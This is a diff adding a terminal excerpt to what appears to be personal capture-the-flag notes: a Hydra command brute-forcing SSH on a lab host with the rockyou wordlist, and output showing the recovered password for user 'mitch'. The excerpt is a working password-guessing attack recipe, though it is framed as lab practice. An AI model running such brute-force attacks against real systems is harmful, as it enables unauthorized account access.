@@ -27,4 +27,20 @@ Below is an example Hydra command to brute force a POST login form:
 
 ![[Pasted image 20220815022213.png]]
 
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/simple_CTF]
+└─$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 10.10.134.118 ssh 
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 08:00:53
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.134.118:2222/
+[2222][ssh] host: 10.10.134.118   login: mitch   password: secret
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 08:01:12
+                                                                                                                       
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/simple_CTF]
+└─$      
+```
 
